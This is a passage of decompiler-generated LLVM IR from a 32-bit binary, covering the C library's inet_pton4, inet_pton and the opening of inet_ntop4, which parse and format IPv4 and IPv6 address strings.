  %v2_804d40b22 = phi i8 [ %v2_804d40b, %dec_label_pc_804d40b.backedge ], [ %v2_804d40b16, %entry ]
  %v1_804d3ce = add nsw i32 %v3_804d40b23, -48
  store i32 %v1_804d3ce, i32* @eax, align 4
  %v9_804d3d1 = icmp eq i8 %v2_804d40b22, 57
  store i1 %v9_804d3d1, i1* %zf.global-to-local, align 1
  %v6_804d3d4 = icmp ugt i32 %v1_804d3ce, 9
  br i1 %v6_804d3d4, label %dec_label_pc_804d3f7, label %dec_label_pc_804d3d6

dec_label_pc_804d3d6:                             ; preds = %dec_label_pc_804d3ce
  %v0_804d3d6 = load i32, i32* @esi, align 4
  %v1_804d3d6 = inttoptr i32 %v0_804d3d6 to i8*
  %v2_804d3d6 = load i8, i8* %v1_804d3d6, align 1
  %v2_804d3d9 = zext i8 %v2_804d3d6 to i32
  %v3_804d3d9 = mul nuw nsw i32 %v2_804d3d9, 10
  %v3_804d3dc = add nsw i32 %v3_804d3d9, %v1_804d3ce
  store i32 %v3_804d3dc, i32* @eax, align 4
  %v9_804d3e0 = icmp eq i32 %v3_804d3dc, 255
  store i1 %v9_804d3e0, i1* %zf.global-to-local, align 1
  %v6_804d3e5 = icmp ugt i32 %v3_804d3dc, 255
  br i1 %v6_804d3e5, label %dec_label_pc_804d430, label %dec_label_pc_804d3e7

dec_label_pc_804d3e7:                             ; preds = %dec_label_pc_804d3d6
  %v0_804d3e7 = load i32, i32* @edx, align 4
  %v1_804d3e7 = icmp eq i32 %v0_804d3e7, 0
  store i1 %v1_804d3e7, i1* %zf.global-to-local, align 1
  %v1_804d3e9 = trunc i32 %v3_804d3dc to i8
  store i8 %v1_804d3e9, i8* %v1_804d3d6, align 1
  %v0_804d3eb = load i1, i1* %zf.global-to-local, align 1
  %v1_804d3eb = icmp eq i1 %v0_804d3eb, false
  br i1 %v1_804d3eb, label %dec_label_pc_804d40b.backedge, label %dec_label_pc_804d3ed

dec_label_pc_804d3ed:                             ; preds = %dec_label_pc_804d3e7
  %v0_804d3ed = load i32, i32* @edi, align 4
  %v1_804d3ed = add i32 %v0_804d3ed, 1
  store i32 %v1_804d3ed, i32* @edi, align 4
  %v1_804d3ee = add i32 %v0_804d3ed, -3
  %v6_804d3ee = sub i32 2, %v0_804d3ed
  %v7_804d3ee = and i32 %v6_804d3ee, %v1_804d3ed
  %v8_804d3ee = icmp slt i32 %v7_804d3ee, 0
  %v9_804d3ee = icmp eq i32 %v1_804d3ee, 0
  store i1 %v9_804d3ee, i1* %zf.global-to-local, align 1
  %v10_804d3ee = icmp slt i32 %v1_804d3ee, 0
  %v3_804d3f1 = icmp eq i1 %v10_804d3ee, %v8_804d3ee
  %v4_804d3f1 = icmp eq i1 %v9_804d3ee, false
  %v5_804d3f1 = and i1 %v4_804d3f1, %v3_804d3f1
  br i1 %v5_804d3f1, label %dec_label_pc_804d430, label %dec_label_pc_804d3f3

dec_label_pc_804d3f3:                             ; preds = %dec_label_pc_804d3ed
  %v0_804d3f3 = load i32, i32* @edx, align 4
  %v1_804d3f3 = and i32 %v0_804d3f3, -256
  %v2_804d3f3 = or i32 %v1_804d3f3, 1
  store i32 %v2_804d3f3, i32* @edx, align 4
  br label %dec_label_pc_804d40b.backedge

dec_label_pc_804d3f7:                             ; preds = %dec_label_pc_804d3ce
  %v9_804d3f7 = icmp eq i8 %v2_804d40b22, 46
  store i1 %v9_804d3f7, i1* %zf.global-to-local, align 1
  %v1_804d3fa = icmp eq i1 %v9_804d3f7, false
  br i1 %v1_804d3fa, label %dec_label_pc_804d430, label %dec_label_pc_804d3fc

dec_label_pc_804d3fc:                             ; preds = %dec_label_pc_804d3f7
  %v0_804d3fc = load i32, i32* @edx, align 4
  %v1_804d3fc = icmp eq i32 %v0_804d3fc, 0
  store i1 %v1_804d3fc, i1* %zf.global-to-local, align 1
  br i1 %v1_804d3fc, label %dec_label_pc_804d430, label %dec_label_pc_804d400

dec_label_pc_804d400:                             ; preds = %dec_label_pc_804d3fc
  %v0_804d400 = load i32, i32* @edi, align 4
  %v9_804d400 = icmp eq i32 %v0_804d400, 4
  store i1 %v9_804d400, i1* %zf.global-to-local, align 1
  br i1 %v9_804d400, label %dec_label_pc_804d430, label %dec_label_pc_804d405

dec_label_pc_804d405:                             ; preds = %dec_label_pc_804d400
  %v0_804d405 = load i32, i32* @esi, align 4
  %v1_804d405 = add i32 %v0_804d405, 1
  store i32 %v1_804d405, i32* @esi, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_804d408 = inttoptr i32 %v1_804d405 to i8*
  store i8 0, i8* %v1_804d408, align 1
  br label %dec_label_pc_804d40b.backedge

dec_label_pc_804d40b.backedge:                    ; preds = %dec_label_pc_804d405, %dec_label_pc_804d3f3, %dec_label_pc_804d3e7
  %v0_804d40b.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d40b = inttoptr i32 %v0_804d40b.pre to i8*
  %v2_804d40b = load i8, i8* %v1_804d40b, align 1
  %v3_804d40b = sext i8 %v2_804d40b to i32
  store i32 %v3_804d40b, i32* @ecx, align 4
  %v1_804d40e = add i32 %v0_804d40b.pre, 1
  store i32 %v1_804d40e, i32* %ebx.global-to-local, align 4
  %v1_804d40f = icmp eq i8 %v2_804d40b, 0
  store i1 %v1_804d40f, i1* %zf.global-to-local, align 1
  %v1_804d411 = icmp eq i1 %v1_804d40f, false
  br i1 %v1_804d411, label %dec_label_pc_804d3ce, label %dec_label_pc_804d40b.dec_label_pc_804d413_crit_edge

dec_label_pc_804d40b.dec_label_pc_804d413_crit_edge: ; preds = %dec_label_pc_804d40b.backedge
  %v0_804d413.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d413

dec_label_pc_804d413:                             ; preds = %dec_label_pc_804d40b.dec_label_pc_804d413_crit_edge, %entry
  %v0_804d413 = phi i32 [ %v0_804d413.pre, %dec_label_pc_804d40b.dec_label_pc_804d413_crit_edge ], [ 0, %entry ]
  %v10_804d413 = icmp eq i32 %v0_804d413, 3
  store i1 %v10_804d413, i1* %zf.global-to-local, align 1
  %v7_804d416 = icmp sgt i32 %v0_804d413, 3
  br i1 %v7_804d416, label %dec_label_pc_804d418, label %dec_label_pc_804d430

dec_label_pc_804d418:                             ; preds = %dec_label_pc_804d413
  %v0_804d418 = load i32, i32* @eax, align 4
  %v3_804d421 = bitcast i32* %stack_var_-20 to i16*
  %v4_804d421 = call i32 @memcpy(i16* %v3_804d421, i32 4, i32 %v0_804d418)
  %v0_804d42b = load i32, i32* @esp, align 4
  %v6_804d42b = icmp eq i32 %v0_804d42b, -16
  store i1 %v6_804d42b, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804d432

dec_label_pc_804d430:                             ; preds = %dec_label_pc_804d400, %dec_label_pc_804d3fc, %dec_label_pc_804d3f7, %dec_label_pc_804d3ed, %dec_label_pc_804d3d6, %dec_label_pc_804d413
  store i1 true, i1* %zf.global-to-local, align 1
  %v0_804d432.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d432

dec_label_pc_804d432:                             ; preds = %dec_label_pc_804d418, %dec_label_pc_804d430
  %v0_804d432 = phi i32 [ %v15_804d3c0, %dec_label_pc_804d418 ], [ %v0_804d432.pre, %dec_label_pc_804d430 ]
  %v0_804d439 = phi i32 [ 1, %dec_label_pc_804d418 ], [ 0, %dec_label_pc_804d430 ]
  %v9_804d432 = icmp eq i32 %v0_804d432, -28
  store i1 %v9_804d432, i1* %zf.global-to-local, align 1
  %v2_804d435 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804d435, i32* @ebx, align 4
  store i32 %v0_804d3ba, i32* @esi, align 4
  ret i32 %v0_804d439

; uselistorder directives
  uselistorder i32 %v0_804d413, { 1, 0 }
  uselistorder i32 %v3_804d40b, { 1, 0 }
  uselistorder i8 %v2_804d40b, { 1, 2, 0 }
  uselistorder i1 %v9_804d400, { 1, 0 }
  uselistorder i32 %v1_804d3ee, { 1, 0 }
  uselistorder i32 %v3_804d3dc, { 1, 2, 0, 3 }
  uselistorder i8 %v2_804d40b22, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804d432, { 1, 0 }
  uselistorder label %dec_label_pc_804d430, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804d3ce, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d43a = load i32, i32* @ebp, align 4
  %v0_804d43b = load i32, i32* @edi, align 4
  %v0_804d43c = load i32, i32* @esi, align 4
  %v0_804d43d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804d445 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d445, i32* @edi, align 4
  %v9_804d449 = icmp eq i32 %arg1, 2
  br i1 %v9_804d449, label %dec_label_pc_804d459, label %dec_label_pc_804d44e

dec_label_pc_804d44e:                             ; preds = %entry
  %v9_804d44e = icmp eq i32 %arg1, 10
  %v1_804d451 = icmp eq i1 %v9_804d44e, false
  br i1 %v1_804d451, label %dec_label_pc_804d5ea, label %dec_label_pc_804d469

dec_label_pc_804d459:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804d445, i32* @eax, align 4
  %v3_804d45f = call i32 @inet_pton4(i32 %v0_804d43d, i32 %v0_804d43c, i32 %v0_804d43b)
  store i32 %v3_804d45f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5fc

dec_label_pc_804d469:                             ; preds = %dec_label_pc_804d44e
  %v2_804d46e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d46e, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_804d473 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_804d473, i32* @ebx, align 4
  %v2_804d47a = add i32 %v5_804d473, 16
  store i32 %v2_804d47a, i32* %eax.global-to-local, align 4
  %v0_804d484 = load i32, i32* @edi, align 4
  %v1_804d484 = inttoptr i32 %v0_804d484 to i8*
  %v2_804d484 = load i8, i8* %v1_804d484, align 1
  %v11_804d484 = icmp eq i8 %v2_804d484, 58
  %v1_804d487 = icmp eq i1 %v11_804d484, false
  br i1 %v1_804d487, label %dec_label_pc_804d51a, label %dec_label_pc_804d489

dec_label_pc_804d489:                             ; preds = %dec_label_pc_804d469
  %v1_804d489 = add i32 %v0_804d484, 1
  store i32 %v1_804d489, i32* @edi, align 4
  %v1_804d48a = inttoptr i32 %v1_804d489 to i8*
  %v2_804d48a = load i8, i8* %v1_804d48a, align 1
  %v11_804d48a = icmp eq i8 %v2_804d48a, 58
  %v1_804d48d = icmp eq i1 %v11_804d48a, false
  br i1 %v1_804d48d, label %dec_label_pc_804d5fa, label %dec_label_pc_804d51a

dec_label_pc_804d4a1:                             ; preds = %dec_label_pc_804d55a
  %v0_804d4a2 = load i32, i32* @edi, align 4
  %v1_804d4a2 = add i32 %v0_804d4a2, 1
  store i32 %v1_804d4a2, i32* @edi, align 4
  %v4_804d4aa = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805087c.107, i32 0, i32 0), i32 %v2_804d561)
  store i32 %v4_804d4aa, i32* %eax.global-to-local, align 4
  %v1_804d4b2 = icmp eq i32 %v4_804d4aa, 0
  br i1 %v1_804d4b2, label %dec_label_pc_804d4d1, label %dec_label_pc_804d4b6

dec_label_pc_804d4b6:                             ; preds = %dec_label_pc_804d4a1
  %v0_804d4b6 = load i32, i32* @ebp, align 4
  %v2_804d4b6 = mul i32 %v0_804d4b6, 16
  %v1_804d4b9 = add i32 %v4_804d4aa, -134547580
  store i32 %v1_804d4b9, i32* %eax.global-to-local, align 4
  %v2_804d4be = or i32 %v2_804d4b6, %v1_804d4b9
  store i32 %v2_804d4be, i32* @ebp, align 4
  %tmp = icmp ult i32 %v2_804d4be, 65536
  br i1 %tmp, label %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge, label %dec_label_pc_804d5fa

dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge: ; preds = %dec_label_pc_804d4b6
  %v0_804d55a.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d55a.outer

dec_label_pc_804d55a.outer:                       ; preds = %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge, %dec_label_pc_804d51a
  %v0_804d55a.pre = phi i32 [ %v0_804d55a.pre.pre, %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge ], [ %stack_var_-36.0.in, %dec_label_pc_804d51a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge ], [ %stack_var_-44.0, %dec_label_pc_804d51a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge ], [ %stack_var_-36.0, %dec_label_pc_804d51a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804d4b6.dec_label_pc_804d55a.outer_crit_edge ], [ 0, %dec_label_pc_804d51a ]
  %v4_804d4d6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804d4db = icmp eq i1 %v4_804d4d6, false
  br label %dec_label_pc_804d55a

dec_label_pc_804d4d1:                             ; preds = %dec_label_pc_804d4a1
  %v0_804d4d1 = load i32, i32* @esi, align 4
  %v9_804d4d1 = icmp eq i32 %v0_804d4d1, 58
  %v1_804d4d4 = icmp eq i1 %v9_804d4d1, false
  br i1 %v1_804d4d4, label %dec_label_pc_804d526, label %dec_label_pc_804d4d6

dec_label_pc_804d4d6:                             ; preds = %dec_label_pc_804d4d1
  br i1 %v1_804d4db, label %dec_label_pc_804d4f2, label %dec_label_pc_804d4dd

dec_label_pc_804d4dd:                             ; preds = %dec_label_pc_804d4d6
  %v5_804d4dd = icmp eq i8* %stack_var_-44.1, null
  %v1_804d4e2 = icmp eq i1 %v5_804d4dd, false
  br i1 %v1_804d4e2, label %dec_label_pc_804d5fa, label %dec_label_pc_804d4e8

dec_label_pc_804d4e8:                             ; preds = %dec_label_pc_804d4dd
  %v0_804d4e8 = load i32, i32* @ebx, align 4
  %v5_804d4e8 = inttoptr i32 %v0_804d4e8 to i8*
  %v0_804d4ec = load i32, i32* @edi, align 4
  %v5_804d4ec = inttoptr i32 %v0_804d4ec to i8*
  br label %dec_label_pc_804d55a

dec_label_pc_804d4f2:                             ; preds = %dec_label_pc_804d4d6
  %v0_804d4f2 = load i32, i32* @edi, align 4
  %v1_804d4f2 = inttoptr i32 %v0_804d4f2 to i8*
  %v2_804d4f2 = load i8, i8* %v1_804d4f2, align 1
  %v3_804d4f2 = icmp eq i8 %v2_804d4f2, 0
  br i1 %v3_804d4f2, label %dec_label_pc_804d5fa, label %dec_label_pc_804d4fb

dec_label_pc_804d4fb:                             ; preds = %dec_label_pc_804d4f2
  %v0_804d4fb = load i32, i32* @ebx, align 4
  %v1_804d4fb = add i32 %v0_804d4fb, 2
  store i32 %v1_804d4fb, i32* @edx, align 4
  %v6_804d502 = icmp ugt i32 %v1_804d4fb, %v2_804d47a
  br i1 %v6_804d502, label %dec_label_pc_804d5fa, label %dec_label_pc_804d508

dec_label_pc_804d508:                             ; preds = %dec_label_pc_804d4fb
  %v0_804d508 = load i32, i32* @ebp, align 4
  %v2_804d50a = udiv i32 %v0_804d508, 256
  %v4_804d50a = trunc i32 %v2_804d50a to i8
  %v3_804d50d = inttoptr i32 %v0_804d4fb to i8*
  store i8 %v4_804d50a, i8* %v3_804d50d, align 1
  %v0_804d50f = load i32, i32* @ebp, align 4
  store i32 %v0_804d50f, i32* %eax.global-to-local, align 4
  %v1_804d511 = trunc i32 %v0_804d50f to i8
  %v2_804d511 = load i32, i32* @ebx, align 4
  %v3_804d511 = add i32 %v2_804d511, 1
  %v4_804d511 = inttoptr i32 %v3_804d511 to i8*
  store i8 %v1_804d511, i8* %v4_804d511, align 1
  %v0_804d514 = load i32, i32* @edx, align 4
  store i32 %v0_804d514, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d51a

dec_label_pc_804d51a:                             ; preds = %dec_label_pc_804d469, %dec_label_pc_804d489, %dec_label_pc_804d508
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804d508 ], [ %v1_804d489, %dec_label_pc_804d489 ], [ %v0_804d484, %dec_label_pc_804d469 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d508 ], [ null, %dec_label_pc_804d489 ], [ null, %dec_label_pc_804d469 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804d55a.outer

dec_label_pc_804d526:                             ; preds = %dec_label_pc_804d4d1
  %v9_804d526 = icmp eq i32 %v0_804d4d1, 46
  %v1_804d529 = icmp eq i1 %v9_804d526, false
  br i1 %v1_804d529, label %dec_label_pc_804d5fa, label %dec_label_pc_804d52f

dec_label_pc_804d52f:                             ; preds = %dec_label_pc_804d526
  %v0_804d52f = load i32, i32* @ebx, align 4
  %v1_804d52f = add i32 %v0_804d52f, 4
  store i32 %v1_804d52f, i32* @esi, align 4
  %v6_804d536 = icmp ugt i32 %v1_804d52f, %v2_804d47a
  br i1 %v6_804d536, label %dec_label_pc_804d5fa, label %dec_label_pc_804d53c

dec_label_pc_804d53c:                             ; preds = %dec_label_pc_804d52f
  %v4_804d53c = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804d53c, i32* @eax, align 4
  store i32 %v0_804d52f, i32* @edx, align 4
  store i32 %v1_804d52f, i32* @ebx, align 4
  %v2_804d544 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d544 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804d544, i32 %v2_804d47a)
  store i32 %v5_804d544, i32* %eax.global-to-local, align 4
  %tmp62 = icmp slt i32 %v5_804d544, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_804d591, label %dec_label_pc_804d5fa

dec_label_pc_804d55a:                             ; preds = %dec_label_pc_804d55a.outer, %dec_label_pc_804d4e8
  %v0_804d55a = phi i32 [ %v0_804d4ec, %dec_label_pc_804d4e8 ], [ %v0_804d55a.pre, %dec_label_pc_804d55a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804d4e8, %dec_label_pc_804d4e8 ], [ %stack_var_-44.1.ph, %dec_label_pc_804d55a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804d4ec, %dec_label_pc_804d4e8 ], [ %stack_var_-36.1.ph, %dec_label_pc_804d55a.outer ]
  %v1_804d55a = inttoptr i32 %v0_804d55a to i8*
  %v2_804d55a = load i8, i8* %v1_804d55a, align 1
  %v3_804d55a = sext i8 %v2_804d55a to i32
  store i32 %v3_804d55a, i32* %eax.global-to-local, align 4
  %v2_804d561 = call i32 @__GI_tolower(i32 %v3_804d55a)
  store i32 %v2_804d561, i32* %eax.global-to-local, align 4
  %v1_804d569 = icmp eq i32 %v2_804d561, 0
  store i32 %v2_804d561, i32* @esi, align 4
  %v1_804d56d = icmp eq i1 %v1_804d569, false
  br i1 %v1_804d56d, label %dec_label_pc_804d4a1, label %dec_label_pc_804d573

dec_label_pc_804d573:                             ; preds = %dec_label_pc_804d55a
  br i1 %v4_804d4d6, label %dec_label_pc_804d591, label %dec_label_pc_804d57a

dec_label_pc_804d57a:                             ; preds = %dec_label_pc_804d573
  %v0_804d57a = load i32, i32* @ebx, align 4
  %v1_804d57a = add i32 %v0_804d57a, 2
  store i32 %v1_804d57a, i32* @edx, align 4
  %v6_804d581 = icmp ugt i32 %v1_804d57a, %v2_804d47a
  br i1 %v6_804d581, label %dec_label_pc_804d5fa, label %dec_label_pc_804d583

dec_label_pc_804d583:                             ; preds = %dec_label_pc_804d57a
  %v0_804d583 = load i32, i32* @ebp, align 4
  %v2_804d585 = udiv i32 %v0_804d583, 256
  %v4_804d585 = trunc i32 %v2_804d585 to i8
  %v3_804d588 = inttoptr i32 %v0_804d57a to i8*
  store i8 %v4_804d585, i8* %v3_804d588, align 1
  %v0_804d58a = load i32, i32* @ebp, align 4
  store i32 %v0_804d58a, i32* %eax.global-to-local, align 4
  %v1_804d58c = trunc i32 %v0_804d58a to i8
  %v2_804d58c = load i32, i32* @ebx, align 4
  %v3_804d58c = add i32 %v2_804d58c, 1
  %v4_804d58c = inttoptr i32 %v3_804d58c to i8*
  store i8 %v1_804d58c, i8* %v4_804d58c, align 1
  %v0_804d58f = load i32, i32* @edx, align 4
  store i32 %v0_804d58f, i32* @ebx, align 4
  br label %dec_label_pc_804d591

dec_label_pc_804d591:                             ; preds = %dec_label_pc_804d573, %dec_label_pc_804d53c, %dec_label_pc_804d583
  %v4_804d591 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d591 = icmp eq i8* %stack_var_-44.1, null
  %v0_804d5c9.pre = load i32, i32* @ebx, align 4
  br i1 %v5_804d591, label %dec_label_pc_804d5c9, label %dec_label_pc_804d598

dec_label_pc_804d598:                             ; preds = %dec_label_pc_804d591
  store i32 1, i32* @esi, align 4
  %v6_804d59f = sub i32 %v0_804d5c9.pre, %v4_804d591
  store i32 %v6_804d59f, i32* @edi, align 4
  %v16_804d5a3 = icmp eq i32 %v0_804d5c9.pre, %v2_804d47a
  %v1_804d5a7 = icmp eq i1 %v16_804d5a3, false
  br i1 %v1_804d5a7, label %dec_label_pc_804d5c1.preheader, label %dec_label_pc_804d5fa

dec_label_pc_804d5c1.preheader:                   ; preds = %dec_label_pc_804d598
  %v3_804d5c189 = inttoptr i32 %v6_804d59f to i8*
  %v9_804d5c394 = icmp slt i8* %v3_804d5c189, inttoptr (i32 1 to i8*)
  br i1 %v9_804d5c394, label %dec_label_pc_804d5c5, label %dec_label_pc_804d5ab

dec_label_pc_804d5ab:                             ; preds = %dec_label_pc_804d5c1.preheader, %dec_label_pc_804d5ab
  %v0_804d5b996 = phi i32 [ %v0_804d5c1.pre, %dec_label_pc_804d5ab ], [ 1, %dec_label_pc_804d5c1.preheader ]
  %v0_804d5ab95 = phi i32 [ %v1_804d5c1.pre, %dec_label_pc_804d5ab ], [ %v6_804d59f, %dec_label_pc_804d5c1.preheader ]
  %v2_804d5b1 = sub i32 %v0_804d5ab95, %v0_804d5b996
  %v6_804d5b3 = add i32 %v2_804d5b1, %v4_804d591
  store i32 %v6_804d5b3, i32* %eax.global-to-local, align 4
  %v2_804d5b7 = sub i32 %v2_804d47a, %v0_804d5b996
  store i32 %v2_804d5b7, i32* @ecx, align 4
  %v1_804d5b9 = add i32 %v0_804d5b996, 1
  store i32 %v1_804d5b9, i32* @esi, align 4
  %v1_804d5ba = inttoptr i32 %v6_804d5b3 to i8*
  %v2_804d5ba = load i8, i8* %v1_804d5ba, align 1
  %v3_804d5ba = zext i8 %v2_804d5ba to i32
  %v4_804d5ba = load i32, i32* @edx, align 4
  %v5_804d5ba = and i32 %v4_804d5ba, -256
  %v6_804d5ba = or i32 %v5_804d5ba, %v3_804d5ba
  store i32 %v6_804d5ba, i32* @edx, align 4
  %v3_804d5bc = inttoptr i32 %v2_804d5b7 to i8*
  store i8 %v2_804d5ba, i8* %v3_804d5bc, align 1
  %v0_804d5be = load i32, i32* %eax.global-to-local, align 4
  %v1_804d5be = inttoptr i32 %v0_804d5be to i8*
  store i8 0, i8* %v1_804d5be, align 1
  %v0_804d5c1.pre = load i32, i32* @esi, align 4
  %v1_804d5c1.pre = load i32, i32* @edi, align 4
  %v2_804d5c1 = inttoptr i32 %v0_804d5c1.pre to i8*
  %v3_804d5c1 = inttoptr i32 %v1_804d5c1.pre to i8*
  %v9_804d5c3 = icmp sgt i8* %v2_804d5c1, %v3_804d5c1
  br i1 %v9_804d5c3, label %dec_label_pc_804d5c5, label %dec_label_pc_804d5ab

dec_label_pc_804d5c5:                             ; preds = %dec_label_pc_804d5ab, %dec_label_pc_804d5c1.preheader
  br label %dec_label_pc_804d5c9

dec_label_pc_804d5c9:                             ; preds = %dec_label_pc_804d591, %dec_label_pc_804d5c5
  %v0_804d5c9 = phi i32 [ %v2_804d47a, %dec_label_pc_804d5c5 ], [ %v0_804d5c9.pre, %dec_label_pc_804d591 ]
  %v16_804d5c9 = icmp eq i32 %v0_804d5c9, %v2_804d47a
  %v1_804d5cd = icmp eq i1 %v16_804d5c9, false
  br i1 %v1_804d5cd, label %dec_label_pc_804d5fa, label %dec_label_pc_804d5cf

dec_label_pc_804d5cf:                             ; preds = %dec_label_pc_804d5c9
  store i32 %v2_804d46e, i32* %eax.global-to-local, align 4
  %tmp64 = inttoptr i32 %arg3 to i16*
  %v5_804d5db = call i32 @memcpy(i16* %tmp64, i32 %v2_804d46e, i32 16)
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5fc

dec_label_pc_804d5ea:                             ; preds = %dec_label_pc_804d44e
  %v1_804d5ea = call i32 @__errno_location(i32 %v0_804d43d)
  %v1_804d5ef = inttoptr i32 %v1_804d5ea to i32*
  store i32 97, i32* %v1_804d5ef, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5fc

dec_label_pc_804d5fa:                             ; preds = %dec_label_pc_804d4fb, %dec_label_pc_804d4f2, %dec_label_pc_804d4b6, %dec_label_pc_804d4dd, %dec_label_pc_804d598, %dec_label_pc_804d53c, %dec_label_pc_804d5c9, %dec_label_pc_804d57a, %dec_label_pc_804d52f, %dec_label_pc_804d526, %dec_label_pc_804d489
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d5fc

dec_label_pc_804d5fc:                             ; preds = %dec_label_pc_804d5ea, %dec_label_pc_804d5cf, %dec_label_pc_804d459, %dec_label_pc_804d5fa
  %v0_804d603 = phi i32 [ -1, %dec_label_pc_804d5ea ], [ 1, %dec_label_pc_804d5cf ], [ %v3_804d45f, %dec_label_pc_804d459 ], [ 0, %dec_label_pc_804d5fa ]
  store i32 %v0_804d43d, i32* @ebx, align 4
  store i32 %v0_804d43c, i32* @esi, align 4
  store i32 %v0_804d43b, i32* @edi, align 4
  store i32 %v0_804d43a, i32* @ebp, align 4
  ret i32 %v0_804d603

; uselistorder directives
  uselistorder i32 %v1_804d5c1.pre, { 1, 0 }
  uselistorder i32 %v0_804d5c1.pre, { 1, 0 }
  uselistorder i32 %v0_804d5b996, { 2, 1, 0 }
  uselistorder i32 %v0_804d5c9.pre, { 1, 0, 2 }
  uselistorder i32 %v2_804d561, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_-36.1, { 1, 0 }
  uselistorder i8* %stack_var_-44.1, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %stack_var_-36.0.in, { 1, 0 }
  uselistorder i32 %v2_804d47a, { 0, 2, 3, 1, 7, 4, 5, 6, 8 }
  uselistorder i32 %v0_804d43d, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 11, 12, 7, 8, 9, 10, 13, 14, 15, 16 }
  uselistorder i32 58, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_804d5fc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d5fa, { 6, 4, 7, 5, 8, 9, 0, 1, 3, 2, 10 }
  uselistorder label %dec_label_pc_804d5c9, { 1, 0 }
  uselistorder label %dec_label_pc_804d5ab, { 1, 0 }
  uselistorder label %dec_label_pc_804d591, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d55a, { 1, 0 }
  uselistorder label %dec_label_pc_804d51a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d55a.outer, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i8*, align 4
  %stack_var_-92 = alloca i8*, align 4
  %stack_var_-33 = alloca i32, align 4
  %stack_var_-31 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_804d605 = load i32, i32* @edi, align 4
  %v0_804d606 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v15_804d60a = ptrtoint i32* %stack_var_-76 to i32
  %v0_804d60d = load i32, i32* @eax, align 4
  %v3_804d611 = and i32 %v0_804d60d, -65536
  %v2_804d617 = ptrtoint i32* %stack_var_-31 to i32
  store i1 false, i1* @df, align 1
  %v0_804d61c = load i32, i32* @edx, align 4
  %v5_804d61c = inttoptr i32 %v0_804d61c to i8*
  store i8* %v5_804d61c, i8** %stack_var_-56, align 4
  %v0_804d620 = load i32, i32* @ecx, align 4
  store i32 %v3_804d611, i32* %stack_var_-33, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-31, align 4
  %v6_804d62b = add i32 %v2_804d617, 4
